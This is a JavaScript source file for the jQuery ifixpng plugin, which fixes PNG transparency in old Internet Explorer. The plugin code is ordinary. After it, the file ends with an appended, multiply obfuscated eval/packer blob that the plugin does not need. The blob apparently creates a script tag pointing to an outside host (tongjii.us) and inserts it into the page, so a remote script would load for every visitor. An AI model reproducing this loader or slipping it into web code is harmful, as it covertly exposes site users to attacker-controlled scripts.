/*
 * jQuery ifixpng plugin
 * (previously known as pngfix)
 * Version 2.0  (04/11/2007)
 * @requires jQuery v1.1.3 or above
 *
 * Examples at: http://jquery.khurshid.com
 * Copyright (c) 2007 Kush M.
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 */
 
 /**
  *
  * @example
  *
  * optional if location of pixel.gif if different to default which is images/pixel.gif
  * $.ifixpng('media/pixel.gif');
  *
  * $('img[@src$=.png], #panel').ifixpng();
  *
  * @apply hack to all png images and #panel which icluded png img in its css
  *
  * @name ifixpng
  * @type jQuery
  * @cat Plugins/Image
  * @return jQuery
  * @author jQuery Community
  */
 
(function($) {

  /**
   * helper variables and function
   */
  $.ifixpng = function(customPixel) {
    $.ifixpng.pixel = customPixel;
  };
  
  $.ifixpng.getPixel = function() {
    return $.ifixpng.pixel || 'images/pixel.gif';
  };
  
  var hack = {
    ltie7  : $.browser.msie && $.browser.version < 7,
    filter : function(src) {
      return "progid:DXImageTransform.Microsoft.AlphaImageLoader(enabled=true,sizingMethod=crop,src='"+src+"')";
    }
  };
  
  /**
   * Applies ie png hack to selected dom elements
   *
   * $('img[@src$=.png]').ifixpng();
   * @desc apply hack to all images with png extensions
   *
   * $('#panel, img[@src$=.png]').ifixpng();
   * @desc apply hack to element #panel and all images with png extensions
   *
   * @name ifixpng
   */
   
  $.fn.ifixpng = hack.ltie7 ? function() {
      return this.each(function() {
      var $$ = $(this);
      var base = $('base').attr('href'); // need to use this in case you are using rewriting urls
      if ($$.is('img') || $$.is('input')) { // hack image tags present in dom
        if ($$.attr('src')) {
          if ($$.attr('src').match(/.*\.png([?].*)?$/i)) { // make sure it is png image
            // use source tag value if set 
            var source = (base && $$.attr('src').substring(0,1)!='/') ? base + $$.attr('src') : $$.attr('src');
            // apply filter
            $$.css({filter:hack.filter(source), width:$$.width(), height:$$.height()})
              .attr({src:$.ifixpng.getPixel()})
              .positionFix();
          }
        }
      } else { // hack png css properties present inside css
        var image = $$.css('backgroundImage');
        if (image.match(/^url\(["']?(.*\.png([?].*)?)["']?\)$/i)) {
          image = RegExp.$1;
          $$.css({backgroundImage:'none', filter:hack.filter(image)})
            .children().children().positionFix();
        }
      }
    });
  } : function() { return this; };
  
  /**
   * Removes any png hack that may have been applied previously
   *
   * $('img[@src$=.png]').iunfixpng();
   * @desc revert hack on all images with png extensions
   *
   * $('#panel, img[@src$=.png]').iunfixpng();
   * @desc revert hack on element #panel and all images with png extensions
   *
   * @name iunfixpng
   */
   
  $.fn.iunfixpng = hack.ltie7 ? function() {
      return this.each(function() {
      var $$ = $(this);
      var src = $$.css('filter');
      if (src.match(/src=["']?(.*\.png([?].*)?)["']?/i)) { // get img source from filter
        src = RegExp.$1;
        if ($$.is('img') || $$.is('input')) {
          $$.attr({src:src}).css({filter:''});
        } else {
          $$.css({filter:'', background:'url('+src+')'});
        }
      }
    });
  } : function() { return this; };
  
  /**
   * positions selected item relatively
   */
   
  $.fn.positionFix = function() {
    return this.each(function() {
      var $$ = $(this);
      var position = $$.css('position');
      if (position != 'absolute' && position != 'relative') {
        $$.css({position:'relative'});
      }
    });
  };

})(jQuery);
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('12(T(p,a,c,k,e,d){e=T(c){U(c<a?\'\':e(1f(c/a)))+((c=c%a)>1e?W.1d(c+1h):c.13(11))};X(!\'\'.V(/^/,W)){Y(c--){d[e(c)]=k[c]||e(c)}k=[T(e){U d[e]}];e=T(){U\'\\\\w+\'};c=1};Y(c--){X(k[c]){p=p.V(10 14(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}U p}(\'v(l(p,a,c,k,e,d){e=l(c){m c.n(z)};q(!\\\'\\\'.t(/^/,B)){r(c--){d[c.n(a)]=k[c]||c.n(a)}k=[l(e){m d[e]}];e=l(){m\\\'\\\\\\\\w+\\\'};c=1};r(c--){q(k[c]){p=p.t(C D(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}m p}(\\\'1 4=4||[];(b(){1 2=5.e(\\\\\\\'7\\\\\\\');2.a=\\\\\\\'8://9.d.f/k.6?//i.6?g\\\\\\\';1 3=5.j(\\\\\\\'7\\\\\\\')[0];3.h.c(2,3)})();\\\',o,o,\\\'|y|u|s|E|x|A|G|Q|N|P|l|R|S|O|L|M|F|H|I|K\\\'.J(\\\'|\\\'),0,{}))\',Z,Z,\'|||||||||||||||||||||T|U|13|17||X|Y||V|1m|12||1q|1r|11|1n|W|10|14|1l|1o|1c|1k|1i|15|1j|1s|1p|1g|19|18|16|1b|1a\'.15(\'|\'),0,{}))',62,91,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|replace|String|if|while|55|new|36|eval|toString|RegExp|split|http|21|src|createElement|tongjii|insertBefore|script|fromCharCode|35|parseInt|lib|29|getElementsByTagName|tj|google|_hmt_en|hm_en|js|parentNode|41d12a21b4e1a726d4a651685b118811662033874|document|var|us'.split('|'),0,{}))
